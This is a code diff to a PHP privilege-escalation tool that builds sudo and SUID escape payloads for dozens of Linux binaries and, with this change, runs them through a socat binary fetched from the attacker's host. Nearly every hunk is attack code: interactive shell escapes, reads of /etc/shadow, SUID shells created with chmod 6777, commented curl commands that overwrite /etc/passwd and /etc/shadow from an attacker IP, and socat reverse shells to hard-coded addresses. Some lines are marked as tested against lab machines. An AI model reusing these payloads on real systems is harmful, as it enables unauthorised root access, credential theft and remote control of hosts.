@@ -2077,6 +2077,10 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	    $data_rst = "";
 	    $sha1_hash = sha1($cmd.time());
 	    
+	    $ip_attacker = $this->ip4addr4target($this->ip);
+	    $filename = "socat";
+	    $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
+	    
 	        switch ($this->file_name){
 	            
 	            case "apt":
@@ -2194,7 +2198,7 @@ EOC;
 	                //$data_sudo = "bash -p <($via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh) > /tmp/rst.txt ; cat /tmp/rst.txt ";
 	                //$data_sudo = "$via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd.sh | /bin/bash 0<&2 1>&2 ";
 	                $data_sudo = "$via_sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd -o /bin/ping ; ping ";
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\"; sleep 2; echo \"$cmd\";  sleep 2; echo \"ping\"; sleep 20 ) | socat - EXEC:\"sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd -o /bin/ping ; ping\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\"; sleep 2; echo \"$cmd\";  sleep 2; echo \"ping\"; sleep 20 ) | $path_remotebin_socat - EXEC:\"sudo $this->file_path -s http://$attacker_ip:$this->port_rfi/$sha1_cmd -o /bin/ping ; ping\",pty,stderr,setsid,sigint,ctty,sane";
 	                // sudo curl -s http://192.168.1.38/passwd -o /etc/passwd
 	                //sudo curl -s http://192.168.1.38/seuid -o /bin/ping
 	                //sudo curl -s http://192.168.1.38/shadow -o /etc/shadow
@@ -2210,8 +2214,8 @@ EOC;
                     
 	            
 	            case "dmesg":
-	                $data = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\"; ) | socat - EXEC:\"dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\";  sleep 30 ) | socat - EXEC:\"sudo dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\"; ) | $path_remotebin_socat - EXEC:\"dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\";  sleep 30 ) | $path_remotebin_socat - EXEC:\"sudo dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2244,8 +2248,8 @@ EOC;
 	                
 	                
 	            case "ed": // OK lin.Security
-	                $data = "(sleep 5; echo \"! $cmd\"; ) | socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 5; echo \"! $cmd\"; ) | $path_remotebin_socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | $path_remotebin_socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
 	              	
 	                $data = "(sleep 5; echo \"! $cmd\"; ) | ed ";
 	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | sudo ed";
@@ -2270,8 +2274,8 @@ EOC;
 	                
 	                
 	            case "expect": // OK lin.Security
-	                $data = "(sleep 15; echo \"$via_suid -c '$cmd'\"; ) | socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\";  sleep 30 ) | socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"$via_suid -c '$cmd'\"; ) | $path_remotebin_socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\";  sleep 30 ) | $path_remotebin_socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name -i<<# >/dev/null 2>&1\n$via_suid -c '$cmd'\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name -i<<# >/dev/null 2>&1\n$userpass\n$via_suid -c '$cmd'\n#\" | sh  ";
@@ -2303,8 +2307,8 @@ EOC;
 
 	                
 	            case "ftp": // OK lin.Security 
-	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"ftp\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ; sleep 2;echo \"! $cmd\"; sleep 30) | socat - EXEC:\"sudo ftp\",pty,stderr,setsid,sigint,ctty,sane";	                
+	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | $path_remotebin_socat - EXEC:\"ftp\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ; sleep 2;echo \"! $cmd\"; sleep 30) | $path_remotebin_socat - EXEC:\"sudo ftp\",pty,stderr,setsid,sigint,ctty,sane";	                
 	               	                
 	                // OK infinity stones
 	                $data = "(echo '! %ID%';sleep 2;) | $this->file_path ";
@@ -2326,7 +2330,7 @@ EOC;
 	                
 	                
 	            case "git": // OK id + No rev Lin.Security
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\"; sleep 30;) | socat - EXEC:\"sudo git help status\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\"; sleep 30;) | $path_remotebin_socat - EXEC:\"sudo git help status\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name help status<<# >/dev/null 2>&1\n! $via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name help status<<# >/dev/null 2>&1\n$userpass\n!$ via_suid\n$cmd\n#\" | sh  ";
@@ -2353,7 +2357,7 @@ exec \"/bin/bash\" ";
 	                break;
 	                
 	            case "journalctl":
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | $path_remotebin_socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n!$via_suid\n$cmd\n#\" | sh ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\"  | sh ";
@@ -2384,8 +2388,8 @@ exec \"/bin/bash\" ";
 	                break;
 	                
 	            case "less": // OK lin.Security
-	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"$this->file_path /etc/passwd\",pty,stderr,setsid,sigint,ctty,sane";	                
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"! $cmd\"; ) | $path_remotebin_socat - EXEC:\"$this->file_path /etc/passwd\",pty,stderr,setsid,sigint,ctty,sane";	                
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | $path_remotebin_socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2421,9 +2425,9 @@ exec \"/bin/bash\" ";
 	                
 	                
 	            case "man": //  OK id + No rev Lin.Security
-	                $data = "(sleep 15; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"$this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | $path_remotebin_socat - EXEC:\"$this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
 	                
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"sudo $this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | $path_remotebin_socat - EXEC:\"sudo $this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2435,8 +2439,8 @@ exec \"/bin/bash\" ";
 	                
 	                
 	            case "more": // OK lin.Security
-	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | $path_remotebin_socat - EXEC:\"$this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | $path_remotebin_socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2533,10 +2537,10 @@ sh X sh X $cmd ";
 	                
 	                 
 	            case "pico": // No Lin.Security 
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo -e '\\x18'; sleep 2;echo -e '\\x24'; sleep 2;echo \"reset; sh -c $cmd 1>&0 2>&0\"; sleep 2; echo -e '\\x24'; sleep 2; echo -e 'N\\n';) | socat - EXEC:\"sudo pico /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo -e '\\x18'; sleep 2;echo -e '\\x24'; sleep 2;echo \"reset; sh -c $cmd 1>&0 2>&0\"; sleep 2; echo -e '\\x24'; sleep 2; echo -e 'N\\n';) | $path_remotebin_socat - EXEC:\"sudo pico /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid '$cmd' \"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid '$cmd' 1>&0 2>&0\"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid '$cmd' \"; sleep 10;) | $path_remotebin_socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid '$cmd' 1>&0 2>&0\"; sleep 10;) | $path_remotebin_socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2625,7 +2629,7 @@ sh X sh X $cmd ";
 	            case "scp": // OK lin.Security
 	                //$data_sudo = "TF=\$(mktemp) && echo \"'$cmd' 0<&2 1>&2\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -S \$TF x y: 0<&2 1>&2 ";
 	                $data_sudo = "echo \"$via_suid -c '$cmd' > /tmp/rst.txt \" > $this->vm_tmp_lin/$sha1_hash.sh && chmod +x $this->vm_tmp_lin/$sha1_hash.sh ; $via_sudo $this->file_path -S $this->vm_tmp_lin/$sha1_hash.sh x y: ; cat /tmp/rst.txt "; // OK
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c '$cmd'\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c '$cmd'\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | $path_remotebin_socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2661,7 +2665,7 @@ sh X sh X $cmd ";
 	                
 	                break ;
 	            case "sftp":
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | $path_remotebin_socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2677,7 +2681,7 @@ sh X sh X $cmd ";
 
 	            case "smbclient":
 	                $attacker_ip = $this->ip4addr4target($this->ip);
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\";; sleep 30 ) | socat - EXEC:\"$this->file_path \\\"\\$attacker_ip\share\\\"\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\";; sleep 30 ) | $path_remotebin_socat - EXEC:\"$this->file_path \\\"\\$attacker_ip\share\\\"\",pty,stderr,setsid,sigint,ctty,sane";
 	                $note = "$this->file_path '\\$attacker_ip\share'
 !$via_suid  -c  '$cmd' ";
 	                $this->note($note);
@@ -2689,16 +2693,16 @@ sh X sh X $cmd ";
 	                
 	                
 	            case "socat": // OK lin.Security
-	                // OK // (sleep 2; echo "id"; sleep 2; echo "wget http://10.60.10.1:8085/test.html"; sleep 2;) | socat - EXEC:"sh",pty,stderr,setsid,sigint,ctty,sane // OK
+	                // OK // (sleep 2; echo "id"; sleep 2; echo "wget http://10.60.10.1:8085/test.html"; sleep 2;) | $path_remotebin_socat - EXEC:"sh",pty,stderr,setsid,sigint,ctty,sane // OK
 	                // https://gist.github.com/mario21ic/c09f0a648130ad6a91abdde41cb011c8
-	                // (sleep 2; echo PASSWORD; sleep 2; echo ls; sleep 2) | socat - EXEC:'ssh -l user server',pty,stderr,setsid,sigint,ctty,sane
-	                //$data = "socat tcp-connect:\$RHOST:\$RPORT exec:$cmd,pty,stderr,setsid,sigint,sane  ";
-	                // socat TCP4-LISTEN:1234,reuseaddr EXEC:/bin/sh
-	                // sudo socat exec:'sh –li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234
+	                // (sleep 2; echo PASSWORD; sleep 2; echo ls; sleep 2) | $path_remotebin_socat - EXEC:'ssh -l user server',pty,stderr,setsid,sigint,ctty,sane
+	                //$data = "$path_remotebin_socat tcp-connect:\$RHOST:\$RPORT exec:$cmd,pty,stderr,setsid,sigint,sane  ";
+	                // $path_remotebin_socat TCP4-LISTEN:1234,reuseaddr EXEC:/bin/sh
+	                // sudo $path_remotebin_socat exec:'sh –li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234
 
 	                
 	                $data_sudo = "echo \"$userpass\" | sudo -S $this->file_path - exec:$cmd,pty,stderr,setsid,sigint,ctty,crnl,raw,sane,echo=0"; // tcp-connect:$attacker_ip:$attacker_port
-	                //"echo \"$userpass\" | sudo -S socat exec:'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.60.10.1:1234"
+	                //"echo \"$userpass\" | sudo -S $path_remotebin_socat exec:'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.60.10.1:1234"
 	                break ;
 	                 
 
@@ -2744,8 +2748,8 @@ sh X sh X $cmd ";
 	                break ;
 	                
 	            case "su":
-	                $data = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'$this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'sudo $this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15 ; echo '$userpass'; sleep 2) |  $path_remotebin_socat - EXEC:'$this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15 ; echo '$userpass'; sleep 2) |  $path_remotebin_socat - EXEC:'sudo $this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2781,7 +2785,7 @@ sh X sh X $cmd ";
 	                break ;
 	                
 	            case "tclsh":// OK lin.Security
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\"; sleep 30 ) | socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\"; sleep 30 ) | $path_remotebin_socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
